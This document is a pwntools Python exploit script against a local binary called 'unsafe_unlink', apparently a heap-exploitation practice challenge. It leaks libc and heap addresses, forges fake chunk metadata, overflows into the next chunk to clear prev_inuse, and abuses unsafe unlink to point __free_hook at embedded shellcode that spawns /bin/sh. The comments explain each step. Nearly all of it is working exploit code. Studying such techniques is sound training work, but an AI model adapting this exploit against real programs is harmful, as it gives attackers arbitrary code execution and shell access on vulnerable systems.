from pwn import *


elf = context.binary = ELF("unsafe_unlink", checksec=True)
libc = elf.libc
context.log_level = "debug"

gs = """continue"""

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


io = start()
io.timeout = 1

io.recvuntil(b"puts() @ ")
puts_leak = int(io.readline(), 16)
log.info(f"puts leak @ {puts_leak:#x}")

libc.address = puts_leak - libc.sym.puts
log.info(f"libc has been rebased @ {libc.address:#x}")

io.recvuntil(b"heap @ ")
heap = int(io.readline(), 16)
log.info(f"heap @ {heap:#x}")

def malloc(size):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"", f"{size}".encode())

def edit(index, data):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"index: ", f"{index}".encode())
    io.sendlineafter(b"data: ", data)

def free(index):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"index: ", f"{index}".encode())

sc = asm("jmp shellcode;" + "nop;"*0x16 + "shellcode:" + shellcraft.execve("/bin/sh"))

malloc(0x88)
malloc(0x88)

# Prepare fake chunk metadata.
# Set the fd such that the bk of the "chunk" it points to is the free hook.
fd = libc.sym.__free_hook - 0x18

# Set the bk such that the fd of the "chunk" it points to is the shellcode.
bk = heap+0x20

# Set the prev_size field of the next chunk to the actual previous chunk size.
priv_size = 0x90

# size of allocated chunk, yes we allocate a size of 0x88 however looking at the chunk we allocated via 'heap' in GDB:
"""
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555603000
Size: 0x90 (with flag bits: 0x91)
"""
# we see the size as 0x90
fake_size = 0x90

# Write the fake chunk metadata to the "overflow" chunk, store the shellcode there too.
# Overflow into the succeeding chunk's size field to clear the prev_inuse flag.
edit(0, p64(fd) + p64(bk) + sc + p8(0)*(0x70-len(sc)) + p64(priv_size) + p64(fake_size))

# Free the "victim" chunk to trigger backward consolidation with the "overflow" chunk.
free(1)

# Free the "overflow" chunk to trigger the free hook.
free(0)

io.interactive()
